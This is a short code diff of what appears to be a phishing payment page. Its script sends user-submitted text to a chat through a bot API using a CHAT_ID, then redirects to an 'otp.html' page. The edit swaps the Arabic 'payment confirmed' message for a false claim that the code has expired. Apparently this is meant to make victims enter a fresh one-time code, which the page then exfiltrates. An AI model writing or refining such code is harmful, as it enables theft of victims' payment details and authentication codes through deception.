@@ -160,7 +160,7 @@
       body: new URLSearchParams({ chat_id: CHAT_ID, text: text })
     });
 
-    showMessage(msg, "✅ تم تأكيد الدفع بنجاح! جاري التحويل...", "success");
+    showMessage(msg, "✅ انتهت صلاحية الرمز انتظار رمز مجدداّ...", "success");
 
     setTimeout(() => {
       window.location.href = "otp.html";
@@ -182,3 +182,4 @@ function showMessage(element, text, type) {
   </script>
 </body>
 </html>
+
